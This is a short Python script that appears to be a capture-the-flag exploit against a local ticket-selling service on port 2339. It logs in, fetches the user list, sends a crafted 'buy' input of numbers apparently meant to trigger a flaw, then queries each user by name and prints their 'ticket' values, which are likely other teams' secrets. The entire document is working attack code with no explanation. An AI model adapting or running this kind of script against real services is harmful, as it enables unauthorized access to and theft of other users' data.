import socket
import sys
import time

user_list = []

if __name__ == "__main__":
        sock = socket.socket()
        sock.connect(("127.0.0.1", 2339))
        sock.recv(100500)
        sock.send(b"lol\n")
        sock.recv(100500)
        sock.send(b"lol\n")
        sock.recv(100500)
        sock.send(b"list\n")
        
        stroka = str(sock.recv(100500))
        stroka.replace('"',"")
        stroka = stroka.replace('"',"")

        index_0 = stroka.find("'")+1
        index_n = stroka.rfind("\\")
        spisok = stroka[index_0:index_n]
        user_list = spisok.split()
        
        sock.send(b"buy\n")
        sock.recv(100500)

        sock.send(b"1 2 3 4 5 6 7 8 9 1 1 2 3 4 5 6 7 8 9 1 1 2 3 4 5 6 7 8 9 1 1 32 32\n")
        sock.recv(100500)

        for user in user_list:
                sock.send(b"name\n")
                sock.recv(100500)
                sock.send(user.encode())
                data = sock.recv(100500).decode()
                begin = data.find("ticket") + len("ticket") + 2
                end = data.rfind('"')
                data = data[begin:end]
                print(data)
        sock.close()
